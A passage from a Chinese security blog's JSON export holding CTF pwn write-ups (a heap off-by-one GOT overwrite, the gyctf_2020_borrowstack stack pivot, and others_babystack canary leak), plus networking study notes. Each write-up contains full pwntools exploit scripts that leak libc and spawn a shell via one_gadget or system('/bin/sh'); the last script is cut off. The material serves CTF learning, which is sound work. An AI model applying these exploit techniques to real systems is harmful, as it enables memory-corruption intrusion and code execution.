__readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( *(&amp;heaparray + v1) ) &#123; printf(&quot;Size : %ld\\nContent : %s\\n&quot;, **(&amp;heaparray + v1), *(*(&amp;heaparray + v1) + 1)); puts(&quot;Done !&quot;); &#125; else &#123; puts(&quot;No such heap !&quot;); &#125; return __readfsqword(0x28u) ^ v3;&#125; 用的是printf函数 遇到\\x00截停 这个就不用说了 留意一下 反正泄露基址肯定是用到show函数的 最后是比较关键的delete函数 看一下我们有什么漏洞可以利用吗 12345678910111213141516171819202122232425262728unsigned __int64 delete_heap()&#123; int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( *(&amp;heaparray + v1) ) &#123; free(*(*(&amp;heaparray + v1) + 1)); free(*(&amp;heaparray + v1)); *(&amp;heaparray + v1) = 0LL; puts(&quot;Done !&quot;); &#125; else &#123; puts(&quot;No such heap !&quot;); &#125; return __readfsqword(0x28u) ^ v3;&#125; 很遗憾的是把指针置零了 不能UAF 或者double free来任意写 程序遍历到这里 就应该有个差不多的思路了 先泄露基址 然后再通过伴随堆块的地址索引来任意写 那么具体怎么实现呢？ 我这里选择的是unsortedbin 泄露main_arena地址 没办法 太好用了 12345678910add(0x88,b&quot;aaaa&quot;) #0add(0x20,b&quot;bbbb&quot;) #1add(0x20,b&quot;cccc&quot;) #2delete(0)payload = b&#x27;a&#x27;*7+b&#x27;b&#x27;add(0x88,payload) #0show(0)io.recvuntil(&quot;b&quot;)main_arena = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arena - (0x7fa0ee626b78-0x7fa0ee262000) chunk1和chunk2的作用我们这里可以先不用去纠结 先来解释一下payload为什么这样写 因为我们要通过show函数泄露基址的话 刚才也说过了 printf函数遇到\\x00就会截停 所以fd域那边就会截停 但是我们创建堆块一定要输入数据 所以泄露fd的话最后得到的是不完整的地址 所以干脆覆盖满fd域 这样就会一直输出到fd域的地址 就泄露了基址 libc的计算办法我前面的博客有说到 这里不赘述 接下来的难点还是在如何利用伴随堆块来任意写 我们没有办法进行堆溢出 不过我们还是有办法溢出一点点字节的 如果我们申请一个0xn8的堆块 但是实际上系统分配给我们的是0xn0的堆块 但是存储起来的size是多出了16个字节的 因为64位情况下 堆块的最小单位是0x10字节 所以我们可以溢出覆盖到下一个chunk的size域 123payload = cyclic(0x88)+b&quot;\\x71&quot;edit(0,payload)delete(1) 这里溢出覆盖到的实际上是chunk1的伴随堆块 这也导致其往后0x70的空间都被划为这个堆块的区域 因为glibc识别到了size 被我们所欺骗了 这时候释放chunk1 bin中就会存储一个0x70大小的free chunk 我们重新申请一个chunk的话 就拥有了0x60大小的空间 同时 你还要注意 chunk2的指针是仍然存在的 而我们获得的空间是包含chunk2的伴随堆块 这时候你回忆一下 edit函数是根据伴随堆块的第二个字长处的地址来写入第一个字长处大小的数据 所以我们通过覆盖这两个字长 就可以做到任意地址任意长度写 12345payload = cyclic(0x8*10)+p64(0x8)+p64(elf.got[&#x27;free&#x27;])add(0x60,payload) #1#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr + 0xf02a4edit(2,p64(onegadget_addr)) 随后还有最后一个你可能会犯错的地方 你之前def的函数 如果有包括delete函数执行完以后 程序给你输出的done 那么是接收不到的 因为如果pwn成功了 直接就进行了系统调用 没有机会输出done的 手动再写一下就可以了 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import*from LibcSearcher import *#io = remote(&quot;node4.buuoj.cn&quot;,29378)io = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu16_64.so&quot;)context.log_level = &quot;debug&quot;def add(size,payload): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Size of Heap : &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content of heap:&quot;) io.send(payload) io.recvuntil(&quot;SuccessFul&quot;)def edit(index,payload): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index)) io.recvuntil(&quot;Content of heap : &quot;) io.send(payload) io.recvuntil(&quot;Done !&quot;)def show(index): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index))def delete(index): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index)) io.recvuntil(&quot;Done !&quot;)add(0x88,b&quot;aaaa&quot;) #0 add(0x20,b&quot;bbbb&quot;) #1add(0x20,b&quot;cccc&quot;) #2delete(0)payload = b&#x27;a&#x27;*7+b&#x27;b&#x27;add(0x88,payload) #0show(0)io.recvuntil(&quot;b&quot;)main_arena = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arena - (0x7fa0ee626b78-0x7fa0ee262000)payload = cyclic(0x88)+b&quot;\\x71&quot;edit(0,payload)delete(1)payload = cyclic(0x8*10)+p64(0x8)+p64(elf.got[&#x27;free&#x27;])add(0x60,payload) #1gdb.attach(io)#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr + 0xf02a4edit(2,p64(onegadget_addr))io.recvuntil(&quot;Your choice :&quot;)io.sendline(b&quot;4&quot;)io.recvuntil(&quot;Index :&quot;)io.sendline(b&quot;2&quot;)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"gyctf_2020_borrowstack","slug":"gyctf-2020-borrowstack","date":"2022-12-18T14:10:11.000Z","updated":"2022-12-18T14:24:38.203Z","comments":true,"path":"2022/12/18/gyctf-2020-borrowstack/","link":"","permalink":"http://example.com/2022/12/18/gyctf-2020-borrowstack/","excerpt":"","text":"一题栈迁移 但是有涉及到内存越界的问题 记录一下 防止以后踩坑 1234567[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida打开看一下 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[96]; // [rsp+0h] [rbp-60h] BYREF setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(aWelcomeToStack); read(0, buf, 0x70uLL); puts(&quot;Done!You can check and use your borrow stack now!&quot;); read(0, &amp;bank, 0x100uLL); return 0;&#125; buf局部变量 bank位于bss段 栈溢出的空间太少了 构造不了rop链 所以是想到把rop写到bank里面 然后栈迁移到对应位置 ps: 这里的逻辑关系得清楚一下 我们平时栈溢出覆盖返回地址 实际上利用main函数这个栈帧结束以后 会返回到父函数 覆盖了返回地址 所以哪怕我们先覆盖了返回地址 但是接下来程序并没有立刻结束 所以并不会影响我们修改bank的内容 此时exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) print(hex(libc_addr)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=28099elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)main_addr = elf.sym[&#x27;main&#x27;]#io = remoteconnect(ip,port)io = process(&quot;./pwn&quot;)debug(1)io.recvuntil(&quot;Ｗelcome to Stack bank,Tell me what you want&quot;)bss_addr = 0x601080leave_addr = 0x400699puts_plt = 0x4004e0rdi_addr = 0x400703ret_addr = 0x4004c9puts_got = elf.got[&#x27;puts&#x27;]read_got = elf.got[&#x27;read&#x27;]payload = cyclic(0x60)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)io.recvuntil(&quot;Done!You can check and use your borrow stack now!&quot;)payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)io.sendline(payload) 但是发现行不通 gdb动调了一下发现 好像跳转到了奇怪的地方 看了一下地址 好像是跑到了bss段上面的got表了 那有没有什么办法可以抬高栈(往低地址处抬高) 我们想到了ret指令 刚好可以读入0x100字节的数据在bank里面 1payload = p64(ret_addr)*20+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) 接着就可以成功泄露puts的真实地址了 接下来两个办法 既然只能刚好覆盖到ret addr 那就直接覆盖成onegadget 因为libc基址已经知道了 或者重复上面的操作 按照常规的system进行系统调用 不过尝试了一下发现不行 也不清楚是什么原因 完整exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) print(hex(libc_addr)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=28099elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)main_addr = elf.sym[&#x27;main&#x27;]#io = remoteconnect(ip,port)io = process(&quot;./pwn&quot;)debug(1)io.recvuntil(&quot;Ｗelcome to Stack bank,Tell me what you want&quot;)bss_addr = 0x601080leave_addr = 0x400699puts_plt = 0x4004e0rdi_addr = 0x400703ret_addr = 0x4004c9puts_got = elf.got[&#x27;puts&#x27;]read_got = elf.got[&#x27;read&#x27;]payload = cyclic(0x60)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)io.recvuntil(&quot;Done!You can check and use your borrow stack now!&quot;)payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)gdb.attach(io)io.sendline(payload)io.recv()puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr+0x4526aio.recvuntil(&quot;Ｗelcome to Stack bank,Tell me what you want&quot;)payload = cyclic(0x68)+p64(onegadget_addr)io.sendline(payload)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"小林图解网络笔记","slug":"小林图解网络笔记","date":"2022-12-18T04:40:54.000Z","updated":"2023-02-08T07:42:17.488Z","comments":true,"path":"2022/12/18/小林图解网络笔记/","link":"","permalink":"http://example.com/2022/12/18/%E5%B0%8F%E6%9E%97%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/","excerpt":"","text":"声明本文如标题所说 是小林图解网络的笔记 所以内容大部分都是我复制粘贴于原文的 只是我个人绝对有必要记住 重要的内容 如果想要了解网络基础 建议看原文 https://xiaolincoding.com/network/ 2.1TCP&#x2F;IP网络模型的存在是因为为了跨设备进程通信 但是设备存在多样性 所以为了兼容 推出一套通用的网络协议 协议分层: 应用层 传输层 网络层 网络接口层 每层各司其职 在网络层中 使用ip地址来区分设备 分为网络号和主机号 网络号用来标识属于哪个子网 主机号标识具体主机 2.2浏览器是如何实现打开一个网页 和服务器进行交互的？ 1.解析URL后 生成http请求消息 2.通过DNS服务器来查询对应域名的ip地址 3.http的传输工作是交给操作系统中的协议栈 浏览器通过socker库来委托协议栈工作 协议栈上半部分有两块协议 分别为TCP和UDP TCP比UDP多很多特性 为了能够保证数据包传输到对方 而UDP只保证发送数据包 但是传输效率高 协议栈的下半部分是IP协议控制的 将数据分成一块块的网络包 物理硬件网卡就是负责完成实际的手法操作 而IP下面的网卡驱动程序就是控制网卡硬件 其中IP还包括两个协议 ICMP 和 ARP ARP用于根据ip地址查询相应的以太网mac地址 ICMP用于报错和控制信息的报告 HTTP默认端口是80 HTTPS默认端口号是443 清楚一点 TCP传输数据还是通过IP来 TCP这是一种传输协议 目标地址和子网掩码都是0.0.0.0的话 是默认网关 如果其他的所有条目都不能匹配的话 就会自动匹配默认网关 4.生成了IP头部后 还需要加上MAC头部 MAC头部是在同一以太网中通过广播和缓存来获取对应路由器的MAC地址 5.通过网卡来将数字信号转化为电信号 因为网络包实际上存放在内存中的一串二进制数字信息 没有办法直接发送给对方 6.交换机根据MAC地址查找 将信号发送到相应的端口 如果没有找到对应的端口 就将包发送到所有端口 还有一种MAC地址称为广播地址 交换机会将这个包发送到除了源端口以外的所有端口 MAC 地址中的 FF:FF:FF:FF:FF:FF IP 地址中的 255.255.255.255 7.经过交换机后来到路由器 8.服务器接收到了数据包 开始拆快递 一层一层进行核验 然后解析出来是HTTP相应报文 就交给浏览器去渲染页面 2.3为了解决不同设备之间的通信 以及在网络互联中的兼容性问题 国际标准化组织制定了开放式系统互联通信参考模型 即OSI网络模型 一共有七层 分别是应用层、表示层、会话层、传输层、网络层、数据链路层以及物理层 应用层，负责给应用程序提供统一的接口； 表示层，负责把数据转换成兼容另一个系统能识别的格式； 会话层，负责建立、管理和终止表示层实体之间的通信会话； 传输层，负责端到端的数据传输； 网络层，负责数据的路由、转发、分片； 数据链路层，负责数据的封帧和差错检测，以及 MAC 寻址； 物理层，负责在物理网络中传输数据帧； 但是由于其过于复杂 且仅仅只是概念上的提出 没有具体的实施方案 实际上使用多的是TCP|IP 模型 Linux系统正是按照这套模型实施网络协议栈的 网络协议栈是指网络中各层协议的总和，其形象的反映了一个网络中数据传输的过程：由上层协议到底层协议，再由底层协议到上层协议 TCP|IP网络模型一共有四层 分别是应用 传输 网络 网络接口层 应用层，负责向用户提供一组应用程序，比如 HTTP、DNS、FTP 等; 传输层，负责端到端的通信，比如 TCP、UDP 等； 网络层，负责网络包的封装、分片、路由、转发，比如 IP、ICMP 等； 网络接口层，负责网络包在物理网络中的传输，比如网络包的封帧、 MAC 寻址、差错检测，以及通过网卡传输网络帧等； 在以太网中 规定了最大传输单元MTU 为1500字节 也就是说单个IP包大小最多为1500字节 当网络包超过了MTU 那就需要分片 如果MTU越小 需要的分包越多 那么网络吞吐能力越差 反之 下图是Linux网络协议栈的流程 LVS补充: LVS主要用于多服务器的负载均衡。它工作在网络层，可以实现高性能，高可用的服务器集群技术。 它廉价，可把许多低性能的服务器组合在一起形成一个超级服务器。 它易用，配置非常简单，且有多种负载均衡的方法。它稳定可靠，即使在集群的服务器中某台服务器无法正常工作，也不影响整体效果。 另外可扩展性也非常好 linux中的lvs的作用,LVS是什么及作用？ - osc_ozlday8e的个人空间 - OSCHINA - 中文开源技术交流社区…_皮小只的博客-CSDN博客 从上图的的网络协议栈，你可以看到： 应用程序需要通过系统调用，来跟 Socket 层进行数据交互； Socket 层的下面就是传输层、网络层和网络接口层； 最下面的一层，则是网卡驱动程序和硬件网卡设备； 当网卡接收到了一个网络包后 通过DMA技术将网络包写入到对应的内存地址 也就是Ring Buffer 接着告诉操作系统这个网络包已经抵达 DMA传输将数据从一个地址空间复制到另一个地址空间，提供在外设和存储器之间或者存储器和存储器之间的高速数据传输 每当网卡接收到一个网络包 就会触发中断告诉操作系统已经接收到了网络包 但是如果网络包的数量非常多 就会频繁触发中断 导致cpu一直处理中断 影响其他进程的执行 所以为了解决频繁中断带来的性能开销，Linux 内核在 2.6 版本中引入了 NAPI 机制 它是混合「中断和轮询」的方式来接收网络包，它的核心概念就是不采用中断的方式读取数据，而是首先采用中断唤醒数据接收的服务程序，然后 poll 的方法来轮询数据。 因此，当有网络包到达时，会通过 DMA 技术，将网络包写入到指定的内存地址，接着网卡向 CPU 发起硬件中断，当 CPU 收到硬件中断请求后，根据中断表，调用已经注册的中断处理函数 发送网络包的话 会从用户态进入内核态 内核会申请一个内核态的sk_buff 内存 用用户发送的数据拷贝到sk_buff 内存 并将其传输到发送缓存区 接下来，网络协议栈从 Socket 发送缓冲区中取出 sk_buff，并按照 TCP&#x2F;IP 协议栈从上到下逐层处理。 如果使用的是 TCP 传输协议发送数据，那么先拷贝一个新的 sk_buff 副本 ，这是因为 sk_buff 后续在调用网络层，最后到达网卡发送完成的时候，这个 sk_buff 会被释放掉。而 TCP 协议是支持丢失重传的，在收到对方的 ACK 之前，这个 sk_buff 不能被删除。所以内核的做法就是每次调用网卡发送的时候，实际上传递出去的是 sk_buff 的一个拷贝，等收到 ACK 再真正删除。 为了在层级之间传递数据时，不发生拷贝，只用 sk_buff 一个结构体来描述所有的网络包，那它是如何做到的呢？是通过调整 sk_buff 中 data 的指针","categories":[{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"others_babystack","slug":"others-babystack","date":"2022-12-16T12:43:10.000Z","updated":"2022-12-16T13:15:39.998Z","comments":true,"path":"2022/12/16/others-babystack/","link":"","permalink":"http://example.com/2022/12/16/others-babystack/","excerpt":"","text":"一道蛮神奇的题 两种解法 不过一种有点非常规 不知道出题人怎么设置的 checksec看一下保护机制 1234567[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ida查看一下main函数 1234567891011121314151617181920212223242526272829303132__int64 __fastcall main(int a1, char **a2, char **a3)&#123; int v3; // eax char s[136]; // [rsp+10h] [rbp-90h] BYREF unsigned __int64 v6; // [rsp+98h] [rbp-8h] v6 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); memset(s, 0, 0x80uLL); while ( 1 ) &#123; menu(); v3 = choice(); switch ( v3 ) &#123; case 2: puts(s); break; case 3: return 0LL; case 1: read(0, s, 0x100uLL); break; default: sendline(&quot;invalid choice&quot;); break; &#125; sendline(&amp;unk_400AE7); &#125;&#125; menu函数这里就不放了 反正就看这些源码也能知道各个选项对应什么作用 两个比较重要的地方 有一个puts泄露的机会 还有read函数可以读入数据 考虑到程序开启了金丝雀 所以这里的puts可以用来泄露金丝雀 覆盖金丝雀的最后一位 使其不为\\x00 因为puts或者printf截停一个字符串就是靠\\x00 这里泄露的时候有个小坑 就是你不能想着读入后7位 然后最后用p64把他补全成八位 因为第八位也恒为00嘛 但是pwntools的p64补全是在首位补全 123456from pwn import*io = process(&quot;./a.out&quot;)context.log_level = &quot;debug&quot;canary = 0x11223344556677payload = p64(canary)io.sendline(payload) 如上程序 假设canary值为上述那样 我们debug看一下最后会输送什么样的数据 123[DEBUG] Sent 0x9 bytes: 00000000 77 66 55 44 33 22 11 00 0a │wfUD│3&quot;··│·│ 00000009 很明显 小端序存储 所以00实际上是被放在了首位 所以可以用sendline多出来的\\n字节覆盖\\x00 然后接收八个字节的数据 最后-0xa 就能得到带有00的canary exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=29125elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#main_addr = elf.sym[&#x27;main&#x27;]main_addr = 0x400908io = remoteconnect(ip,port)#io = process(&quot;./pwn&quot;)debug(1)puts_plt = 0x400690rdi_addr = 0x400a93puts_got = elf.got[&#x27;puts&#x27;]leave_addr = 0x400824io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x87)+b&quot;1&quot;io.sendline(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recvuntil(&quot;1&quot;)canary = u64(io.recv(8).ljust(8,b&quot;\\x00&quot;))-0xa 接下来还要想办法控制程序执行流 一开始看到read只能读入0x100的数据 我是觉得不能构造rop链来泄露libc基址 但是最后查看wp的时候 发现大家都是用泄露基址的办法做的 也是比较神奇 数据竟然能超出限制读入 第一种办法用到的是泄露__libc_start_main函数的地址 稍微了解一下程序函数调用就会知道 main函数并不是程序第一个调用的 __libc_start_main函数的地址应该是在rbp的下一个字长处 1234567891011io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x98)io.send(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recv(0x98)start_addr = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = start_addr - 240 - libc.sym[&#x27;__libc_start_main&#x27;]print(hex(libc_addr)) 这里泄露出来的start_addr之所以要减去240 还得要动调来看 泄露出来的地址距离__libc_start_main函数还有231偏移 当然这只是本地libc的偏移 远程的等下还得微调一下 此时我们得到算式: 1libc_addr = start_addr - 231 - libc.sym[&#x27;__libc_start_main&#x27;] 在本地上 其后三位是000 但是远程环境不同 运行看一下差了多少 得到的值是0x7f3fea3e8009 多了9 那就减去240就可以得到远程的libc基址了 虽然我们得到了libc基址 但是由于read可以溢出的长度不够我们构造一个system链 所以这里采取修改ret addr为one_gadget 完整exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=29125elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#main_addr = elf.sym[&#x27;main&#x27;]main_addr = 0x400908io = remoteconnect(ip,port)#io = process(&quot;./pwn&quot;)debug(1)puts_plt = 0x400690rdi_addr = 0x400a93puts_got = elf.got[&#x27;puts&#x27;]leave_addr = 0x400824io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x87)+b&quot;1&quot;io.sendline(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recvuntil(&quot;1&quot;)canary = u64(io.recv(8).ljust(8,b&quot;\\x00&quot;))-0xaio.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = cyclic(0x98)io.send(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;2&quot;)io.recv(0x98)start_addr = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = start_addr - 240 - libc.sym[&#x27;__libc_start_main&#x27;]#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr + 0xf1147io.recvuntil(&quot;&gt;&gt; &quot;)io.sendline(b&quot;1&quot;)payload = b&quot;a&quot;*0x88+p64(canary)+p64(0xabcdabcd)+p64(onegadget_addr)io.send(payload)io.recvuntil(&quot;&gt;&gt; &quot;)io.send(b&quot;3&quot;)io.interactive() 不过这题不知道为啥 read函数虽然对输入的数据进行了限制 但是好像还是可以超额输入 原理暂时还不清楚 留个坑 所以这题可以用构造rop链 泄露libc基址 1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *#p=remote(&#x27;node4.buuoj.cn&#x27;,27865)p=process(&#x27;./pwn&#x27;)elf=ELF(&#x27;./pwn&#x27;)context.log_level=&#x27;debug&#x27;#泄露canaryp.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)payload=&#x27;a&#x27;*(0x80+8)p.sendline(payload)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)p.recvuntil(&#x27;a\\n&#x27;)canary=u64(p.recv(7).rjust(8,b&#x27;\\x00&#x27;))pop_rdi=0x400a93puts_got=elf.got[&#x27;puts&#x27;]puts_plt=0x400690main_addr=0x400908payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)p.sendline(payload) payload总长明显是超过0x100的 但是gdb动调看了一下 确实是能写进去的 你直接打断点是看不到这些栈的内容的 这一段在高地址处 因为是之前执行过的栈 所以你需要用 set $rsp &#x3D; $rsp - 0x68来调整一下rsp寄存器的位置 因为stack是以sp寄存器为0来延申的 这里还有一点是要注意的 此时我们一直是在while循环中 在执行完一连串的指令后 并不会跳转到返回地址 因为这并不属于一个栈帧的结束 从栈上的地址逐渐降低也可以看出来 所以我们需要手动退出while循环 剩下的就没什么好说的了 完整exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *from LibcSearcher import *#p=remote(&#x27;node4.buuoj.cn&#x27;,27865)p=process(&#x27;./pwn&#x27;)elf=ELF(&#x27;./pwn&#x27;)context.log_level=&#x27;debug&#x27;#泄露canaryp.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)payload=&#x27;a&#x27;*(0x80+8)p.sendline(payload)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)p.recvuntil(&#x27;a\\n&#x27;)canary=u64(p.recv(7).rjust(8,b&#x27;\\x00&#x27;))pop_rdi=0x400a93puts_got=elf.got[&#x27;puts&#x27;]puts_plt=0x400690main_addr=0x400908payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)p.sendline(payload)p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;3&#x27;)p.recv()puts_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base=puts_addr-libc.dump(&#x27;puts&#x27;)system=libc_base+libc.dump(&#x27;system&#x27;)binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)payload+=p64(pop_rdi)+p64(binsh)+p64(system)p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)p.sendline(payload)p.sendlineafter(&#x27;&gt;&gt;&#